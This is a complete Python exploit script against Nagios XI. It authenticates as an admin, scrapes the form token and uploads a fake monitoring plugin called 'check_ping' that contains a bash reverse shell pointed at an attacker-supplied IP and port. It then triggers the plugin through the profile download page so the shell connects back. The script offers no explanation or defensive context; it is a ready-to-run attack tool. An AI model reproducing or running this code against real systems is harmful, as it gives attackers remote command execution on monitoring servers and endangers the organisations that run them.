import requests
from lxml import html
import argparse
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def extract_nsp(url, session):
    print(f"[+] Grabbing NSP from: {url}")
    response = session.get(url, verify=False)

    if response.status_code == 200:
        print(f"[+] Retrieved page contents from: {url}")
    else:
        print(f"[+] Unable to open page: {url} to obtain NSP")
        exit(1)

    tree = html.fromstring(response.content)
    nsp = tree.xpath('//input[@name="nsp"]/@value')[0]

    if nsp:
        print(f"[+] Extracted NSP - value: {nsp}")
    else:
        print(f"[+] Unable to obtain NSP from {url}")
        exit(1)

    return nsp

def authenticate(user_val, session):
    post_values = {
        'username': user_val['user'],
        'password': user_val['pass'],
        'pageopt': 'login',
        'nsp': user_val['login_nsp']
    }

    print("[+] Attempting to login...")
    response = session.post(user_val['login_url'], data=post_values, verify=False)

    if response.status_code == 302 or response.history:
        print("[+] Authentication success")
    else:
        print("[+] Unable to login, check your credentials")
        exit(1)

    print("[+] Checking we have admin rights...")
    response = session.get(user_val['plugin_url'], verify=False)
    tree = html.fromstring(response.content)
    title = tree.find(".//title").text

    if 'Manage' in title:
        print("[+] Admin access confirmed")
    else:
        print("[+] Unable to reach login page, are you admin?")
        exit(1)

def upload_payload(user_val, session):
    payload = (
        "-----------------------------18467633426500\n"
        "Content-Disposition: form-data; name=\"upload\"\n\n1\n"
        "-----------------------------18467633426500\n"
        "Content-Disposition: form-data; name=\"nsp\"\n\n{nsp}\n"
        "-----------------------------18467633426500\n"
        "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n20000000\n"
        "-----------------------------18467633426500\n"
        "Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"check_ping\"\n"
        "Content-Type: text/plain\n\n"
        "bash -i >& /dev/tcp/{reverseip}/{reverseport} 0>&1\n"
        "-----------------------------18467633426500--\n"
    ).format(nsp=user_val['plugin_nsp'], reverseip=user_val['reverseip'], reverseport=user_val['reverseport'])

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-GB,en;q=0.5',
        'Referer': user_val['plugin_url'],
        'Content-Type': 'multipart/form-data; boundary=---------------------------18467633426500',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }

    print("[+] Uploading payload...")
    response = session.post(user_val['plugin_url'], data=payload, headers=headers, verify=False)
    tree = html.fromstring(response.content)

    upload = any('New plugin was installed' in div.text_content() for div in tree.findall(".//div[@class='message']"))

    if upload:
        print("[+] Payload uploaded")
    else:
        print('[+] Unable to upload payload')
        exit(1)

def trigger_payload(user_val, session):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }

    print(f"[+] Triggering payload: if successful, a reverse shell will spawn at {user_val['reverseip']}:{user_val['reverseport']}")
    session.get(user_val['profile_gen_url'], headers=headers, verify=False)

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--ssl', required=True, choices=['true', 'false'])
    parser.add_argument('--user', required=True)
    parser.add_argument('--pass', required=True)
    parser.add_argument('--reverseip', required=True)
    parser.add_argument('--reverseport', required=True)
    args = parser.parse_args()

    user_val = vars(args)
    user_val['proto'] = 'https://' if user_val['ssl'] == 'true' else 'http://'
    user_val['login_url'] = f"{user_val['proto']}{user_val['host']}/nagiosxi/login.php"
    user_val['plugin_url'] = f"{user_val['proto']}{user_val['host']}/nagiosxi/admin/monitoringplugins.php"
    user_val['profile_gen_url'] = f"{user_val['proto']}{user_val['host']}/nagiosxi/includes/components/profile/profile.php?cmd=download"

    return user_val

def check_cookie():
    if os.path.exists('cookie.txt'):
        print("cookie.txt already exists - delete prior to running")
        exit(1)

if __name__ == '__main__':
    check_cookie()
    user_val = parse_args()

    with requests.Session() as session:
        user_val['login_nsp'] = extract_nsp(user_val['login_url'], session)
        authenticate(user_val, session)
        user_val['plugin_nsp'] = extract_nsp(user_val['plugin_url'], session)
        upload_payload(user_val, session)
        trigger_payload(user_val, session)
